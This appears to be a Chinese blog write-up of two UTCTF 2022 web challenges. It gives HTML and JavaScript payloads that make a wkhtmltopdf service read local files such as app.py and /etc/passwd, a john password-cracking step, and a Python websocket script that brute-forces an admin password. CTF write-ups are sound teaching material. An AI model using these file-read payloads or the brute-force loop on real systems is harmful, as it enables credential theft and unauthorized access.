  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">Tlife</a></div><div class="navbar-menu"><div class="navbar-end"></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-03-12T01:59:06.000Z" title="2022/3/12 上午9:59:06">2022-03-12</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-05-07T14:32:12.378Z" title="2022/5/7 下午10:32:12">2022-05-07</time></span></div></div><h1 class="title is-3 is-size-4-mobile">2022UTCTF</h1><div class="content"><h2 id="HTMLPDF"><a href="#HTMLPDF" class="headerlink" title="HTMLPDF"></a>HTMLPDF</h2><p>题目都还看到就被师傅们做出来了</p>
<p>通过使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;b&gt;Try Me!&lt;&#x2F;b&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;app.py&quot; height&#x3D;&quot;1600px&quot; width&#x3D;&quot;800px&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>可以读到源码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pdfkit</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> spwd</span><br><span class="line"><span class="keyword">import</span> crypt</span><br><span class="line"><span class="keyword">from</span> hmac <span class="keyword">import</span> compare_digest <span class="keyword">as</span> compare_hash</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(<span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>])</span><br><span class="line">def index():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        html_content = request.form.get(<span class="string">&#x27;content&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> html_content is None:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;/environ&#x27;</span> <span class="keyword">in</span> html_content:</span><br><span class="line">            # Don&#x27;t let them read the flag from /proc/&lt;pid&gt;/environ</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Aren&#x27;</span><span class="string">&#x27;t you sneaky? That&#x27;</span><span class="string">&#x27;s a good idea, but not the intended solution, so keep trying :)&#x27;</span></span><br><span class="line">        # Filenames.</span><br><span class="line">        html = render_template(<span class="string">&#x27;document.html&#x27;</span>, content=html_content)</span><br><span class="line">        uid = str(hash(time.time())) # Using a hash of the time ensures unique filenames between requests.</span><br><span class="line">        out_filename = uid+<span class="string">&#x27;.pdf&#x27;</span></span><br><span class="line">        html_filename = uid+<span class="string">&#x27;.html&#x27;</span></span><br><span class="line">        html_file = open(html_filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        html_file.write(html)</span><br><span class="line">        html_file.close()</span><br><span class="line">        # Generate PDF.</span><br><span class="line">        TIMEOUT = <span class="string">&#x27;3&#x27;</span></span><br><span class="line">        subprocess.run([<span class="string">&#x27;xvfb-run&#x27;</span>, <span class="string">&#x27;timeout&#x27;</span>, <span class="string">&#x27;--preserve-status&#x27;</span>, <span class="string">&#x27;-k&#x27;</span>, TIMEOUT, TIMEOUT, <span class="string">&#x27;wkhtmltopdf&#x27;</span>,<span class="string">&#x27;--enable-local-file-access&#x27;</span>, html_filename, out_filename])</span><br><span class="line">        # Cleanup and return result.</span><br><span class="line">        out_file = open(out_filename, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        output = out_file.read()</span><br><span class="line">        out_file.close()</span><br><span class="line">        #os.remove(out_filename)</span><br><span class="line">        #os.remove(html_filename)</span><br><span class="line">        response = make_response(output)</span><br><span class="line">        response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/pdf&#x27;</span></span><br><span class="line">        response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;inline; filename=document.pdf&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">@app.route(<span class="string">&#x27;/admin&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>])</span><br><span class="line">def adminLogin():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username is None or password is None:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line">        # Check that username and password match a user in the system.</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pw1 = spwd.getspnam(username).sp_pwd</span><br><span class="line">            pw2 = crypt.crypt(password, pw1)</span><br><span class="line">            <span class="keyword">if</span> compare_hash(pw2, pw1):</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, msg=os.environ[<span class="string">&#x27;FLAG&#x27;</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, msg=<span class="string">&#x27;Incorrect password!&#x27;</span>)</span><br><span class="line">            except KeyError:</span><br><span class="line">            # No such username.</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, msg=<span class="string">&#x27;Incorrect username!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>存在同源策略，因此不允许直接跨目录实现文件读取，只能读取web目录下的，绕过方法:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;x&#x3D;new XMLHttpRequest;x.onload&#x3D;function()&#123;document.write(this.responseText)&#125;;x.open(&quot;GET&quot;,&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;);x.send();&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>拿到密码以后，发现使用弱密码加密，使用john爆破密码</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220312101124.png" alt="img" style="zoom:67%;">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john test_passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220312101115.png" alt="img"></p>
<h2 id="websocket"><a href="#websocket" class="headerlink" title="websocket"></a>websocket</h2><p>抓包抓不到东西，看起来是要用socket去连接，然后爆破密码吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">hello</span>():</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&quot;test_pa.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        paswd=f.readlines()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> paswd:</span><br><span class="line">            uri = <span class="string">&quot;ws://web1.utctf.live:8651/internal/ws&quot;</span></span><br><span class="line">            <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(uri) <span class="keyword">as</span> websocket:</span><br><span class="line">                <span class="keyword">await</span> websocket.send(<span class="string">&#x27;begin&#x27;</span>)</span><br><span class="line">                result = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">                <span class="comment">#print(result)</span></span><br><span class="line">                <span class="keyword">await</span> websocket.send(<span class="string">&#x27;user admin&#x27;</span>)</span><br><span class="line">                <span class="keyword">await</span> websocket.send(<span class="string">&#x27;pass &#x27;</span>+i.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>))</span><br><span class="line">                result = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">                print(result)</span><br><span class="line">                print(<span class="string">f&#x27;pass <span class="subst">&#123;i&#125;</span>&#x27;</span>.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>))</span><br><span class="line">                <span class="keyword">if</span> result!= <span class="string">&quot;badpass&quot;</span>:</span><br><span class="line">                    print(i)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asyncio.get_event_loop().run_until_complete(hello())</span><br></pre></td></tr></table></figure>
